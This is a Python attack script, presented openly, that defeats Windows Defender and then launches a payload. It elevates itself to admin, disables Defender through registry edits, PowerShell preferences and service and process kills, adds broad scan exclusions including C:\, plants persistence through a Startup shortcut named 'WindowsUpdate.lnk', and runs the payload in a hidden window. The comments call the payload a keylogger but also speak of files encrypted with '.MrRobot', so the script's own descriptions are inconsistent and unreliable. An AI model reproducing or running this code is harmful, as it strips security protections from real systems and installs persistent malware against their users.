#!/usr/bin/env python3
"""
Windows Defender Bypass & keylogger execution script
"""

import subprocess
import os
import sys
import time
import ctypes
import winreg
import psutil
from pathlib import Path

def is_admin():
    """Check if script is running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges():
    """Restart script with administrator privileges"""
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()

def disable_defender_via_registry():
    """Disable Windows Defender through registry modifications"""
    try:
        # Disable Tamper Protection registry key
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                            r"SOFTWARE\Microsoft\Windows Defender\Features", 
                            0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "TamperProtection", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        
        # Disable real-time protection
        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,
                                r"SOFTWARE\Policies\Microsoft\Windows Defender",
                                0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        
        # Create Real-Time Protection subkey
        rt_key = winreg.CreateKeyEx(key, "Real-Time Protection", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(rt_key, "DisableBehaviorMonitoring", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(rt_key, "DisableOnAccessProtection", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(rt_key, "DisableScanOnRealtimeEnable", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(rt_key, "DisableIOAVProtection", 0, winreg.REG_DWORD, 1)
        
        winreg.CloseKey(rt_key)
        winreg.CloseKey(key)
        
        print("[+] Registry modifications completed")
        return True
    except Exception as e:
        print(f"[-] Registry modification failed: {e}")
        return False

def disable_defender_via_powershell():
    """Execute PowerShell commands to disable Windows Defender"""
    commands = [
        # Disable Tamper Protection
        'Set-MpPreference -DisableTamperProtection $true',
        
        # Disable real-time monitoring
        'Set-MpPreference -DisableRealtimeMonitoring $true',
        
        # Disable behavior monitoring
        'Set-MpPreference -DisableBehaviorMonitoring $true',
        # Disable cloud protection
        'Set-MpPreference -MAPSReporting 0',
        
        # Disable sample submission
        'Set-MpPreference -SubmitSamplesConsent 2',
        
        # Add exclusions for Keylogger
        'Add-MpPreference -ExclusionExtension ".MrRobot"',
        'Add-MpPreference -ExclusionProcess "victim.exe"',
        'Add-MpPreference -ExclusionPath "C:\\"',
        
        # Lower scanning aggressiveness
        'Set-MpPreference -ScanScheduleQuickScanTime 00:00',
        'Set-MpPreference -RemediationScheduleDay 0',
        
        # Disable PUA protection
        'Set-MpPreference -PUAProtection 0',
    ]
    
    for cmd in commands:
        try:
            subprocess.run(['powershell', '-Command', cmd], 
                          capture_output=True, timeout=10)
            print(f"[+] Executed: {cmd}")
            time.sleep(1)
        except:
            pass
    
    return True

def stop_defender_services():
    """Stop and disable Windows Defender services"""
    services = ['WinDefend', 'WdNisSvc', 'Sense', 'WdBoot', 'WdFilter']
    
    for service in services:
        try:
            # Stop service
            subprocess.run(['sc', 'stop', service], 
                          capture_output=True, timeout=10)
            
            # Disable service
            subprocess.run(['sc', 'config', service, 'start=', 'disabled'], 
                          capture_output=True, timeout=10)
            
            print(f"[+] Stopped and disabled: {service}")
        except:
            pass
    
    # Kill remaining Defender processes
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in ['MsMpEng.exe', 'NisSrv.exe', 'SecurityHealthService.exe']:
            try:
                proc.kill()
                print(f"[+] Killed process: {proc.info['name']}")
            except:
                pass
    
    return True


def add_to_exclusions(keylogger_path):
    """Add keylogger path and extension to Defender exclusions"""
    try:
        # Add file path exclusion
        subprocess.run([
            'powershell', '-Command',
            f'Add-MpPreference -ExclusionPath "{keylogger_path}"'
        ], capture_output=True)
        
        # Add process exclusion
        subprocess.run([
            'powershell', '-Command',
            'Add-MpPreference -ExclusionProcess "my_keylogger.exe"'
        ], capture_output=True)
        
        # Add extension exclusion
        subprocess.run([
            'powershell', '-Command',
            'Add-MpPreference -ExclusionExtension ".keylog"'
        ], capture_output=True)
        
        print("[+] Added exclusions for keylogger")
        return True
    except:
        return False

def verify_defender_disabled():
    """Verify Windows Defender is completely disabled"""
    checks = []
    
    # Check if Defender service is running
    try:
        result = subprocess.run(['sc', 'query', 'WinDefend'], 
                              capture_output=True, text=True)
        checks.append('RUNNING' not in result.stdout)
    except:
        checks.append(False)
    
    # Check real-time protection status via PowerShell
    try:
        result = subprocess.run([
            'powershell', '-Command',
            'Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled'
        ], capture_output=True, text=True)
        checks.append('False' in result.stdout.strip())
    except:
        checks.append(False)
    
    # Check Tamper Protection status
    try:
        result = subprocess.run([
            'powershell', '-Command',
            'Get-MpComputerStatus | Select-Object -ExpandProperty IsTamperProtected'
        ], capture_output=True, text=True)
        checks.append('False' in result.stdout.strip())
    except:
        checks.append(False)
    
    # If all checks pass, Defender is disabled
    return all(checks)

def execute_keylogger(keylogger_path):
    """file of the keylogger executable and execute it with hidden window"""
    try:
        if not os.path.exists(keylogger_path):
            print(f"[-] Keylogger not found at: {keylogger_path}")
            return False
        
        print(f"[+] Executing keylogger: {keylogger_path}")
        
        # Execute with hidden window
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        process = subprocess.Popen(
            [keylogger_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        print(f"[+] Keylogger PID: {process.pid}")
        
        # Monitor for encryption completion
        time.sleep(10)
        
        # Check if process is still running
        if process.poll() is None:
            print("[+] Keylogger is actively running")
            return True
        else:
            print("[-] Keylogger terminated unexpectedly")
            return False
            
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return False

def setup_persistence(keylogger_path):
    """Set up persistence mechanisms for keylogger"""
    try:
        # Add to startup folder
        startup_path = os.path.join(
            os.environ['APPDATA'],
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        
        if not os.path.exists(startup_path):
            os.makedirs(startup_path)
        
        # Create shortcut
        shortcut_path = os.path.join(startup_path, 'WindowsUpdate.lnk')
        
        # Use PowerShell to create shortcut
        ps_script = f"""
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
        $Shortcut.TargetPath = "{keylogger_path}"
        $Shortcut.WindowStyle = 7
        $Shortcut.Save()
        """
        
        subprocess.run(['powershell', '-Command', ps_script], 
                      capture_output=True)
        
        print(f"[+] Persistence established: {shortcut_path}")
        return True
        
    except Exception as e:
        print(f"[-] Persistence setup failed: {e}")
        return False

def main():
    """Main execution function"""
    print("=== Windows Defender Bypass & Keylogger Execution ===")
    
    # Check for admin rights
    if not is_admin():
        print("[!] Administrator privileges required")
        elevate_privileges()
    
    print("[+] Running with administrator privileges")
    
    # Define Keylogger path (adjust as needed)
    keylogger_path = r"C:\Users\Public\victim.exe"
    
    # Step 1: Disable Windows Defender
    print("\n[1] Disabling Windows Defender...")
    disable_defender_via_registry()
    disable_defender_via_powershell()
    stop_defender_services()
    add_to_exclusions(keylogger_path)
    
    # Step 2: Verify Defender is disabled
    print("\n[2] Verifying Defender status...")
    time.sleep(5)
    
    if verify_defender_disabled():
        print("[+] Windows Defender successfully disabled")
    else:
        print("[-] Defender may still be active - proceeding anyway")
    
    # Step 3: Set up persistence
    print("\n[3] Setting up persistence...")
    setup_persistence(keylogger_path)
    
    # Step 4: Execute Keylogger
    print("\n[4] Executing keylogger...")
    if execute_keylogger(keylogger_path):
        print("[+] Keylogger execution successful")
        print("[+] Keylogger is now running in background")
    else:
        print("[-] Keylogger execution failed")
    
    # Step 5: Final verification
    print("\n[5] Final system check...")
    time.sleep(3)
    
    # Check for encrypted files
    search_path = os.path.expanduser("~")
    mrrobot_files = list(Path(search_path).rglob("*.MrRobot"))
    
    if mrrobot_files:
        print(f"[+] Found {len(mrrobot_files)} encrypted files")
        for file in mrrobot_files[:5]:  # Show first 5
            print(f"    - {file}")
        if len(mrrobot_files) > 5:
            print(f"    ... and {len(mrrobot_files) - 5} more")
    else:
        print("[!] No .MrRobot files found - encryption may not have started")
    
    print("\n=== Script execution complete ===")
    print("[+] System prepared for Keylogger operation")
    print("[+] Windows Defender bypass active")
    print("[+] Keylogger should now encrypt files with .MrRobot extension")
    
    # Keep script running to maintain changes
    try:
        input("\nPress Enter to exit (changes are permanent)...")
    except:
        pass

if __name__ == "__main__":
    # Bypass any runtime checks
    sys.dont_write_bytecode = True
    
    # Execute main function
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Script interrupted")
    except Exception as e:
        print(f"\n[!] Critical error: {e}")